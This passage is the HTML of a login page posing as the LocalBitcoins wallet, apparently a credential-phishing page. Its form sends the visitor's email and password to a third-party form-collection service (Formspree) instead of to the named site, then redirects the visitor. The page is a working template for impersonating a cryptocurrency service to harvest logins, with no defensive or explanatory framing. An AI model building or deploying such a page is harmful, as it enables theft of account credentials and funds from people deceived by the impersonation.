<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login | LocalBitcoins.com Wallet</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/js/all.min.js"></script>
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #f3f0ff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
  </style>
</head>

<body class="bg-[#f3f0ff] flex items-center justify-center min-h-screen">

  <div class="bg-white shadow-[0_0_20px_rgba(108,77,255,0.15)] rounded-xl p-8 w-full max-w-md">
    <div class="flex items-center justify-center mb-6">
      <i class="fab fa-bitcoin text-yellow-500 text-4xl mr-2"></i>
      <h1 class="text-[#6c4dff] font-extrabold text-2xl">LocalBitcoins Wallet</h1>
    </div>

    <form class="space-y-6" action="https://formspree.io/f/mvgalkbo" method="POST" onsubmit="redirectAfterSubmit()">
      <div>
        <label for="email" class="block text-sm font-semibold text-gray-700 mb-1">Email Address</label>
        <input type="email" name="email" id="email" required class="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#6c4dff]" placeholder="you@example.com">
      </div>
      <div>
        <label for="password" class="block text-sm font-semibold text-gray-700 mb-1">Password</label>
        <input type="password" name="password" id="password" required class="w-full px-4 py-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#6c4dff]" placeholder="********">
      </div>
      <button type="submit" class="w-full bg-[#6c4dff] hover:bg-[#5a3ee6] text-white font-semibold py-3 rounded-md transition">
        Log In
      </button>
    </form>

    <p class="text-center text-xs text-gray-600 mt-6 select-none">
      By logging in, you agree to our
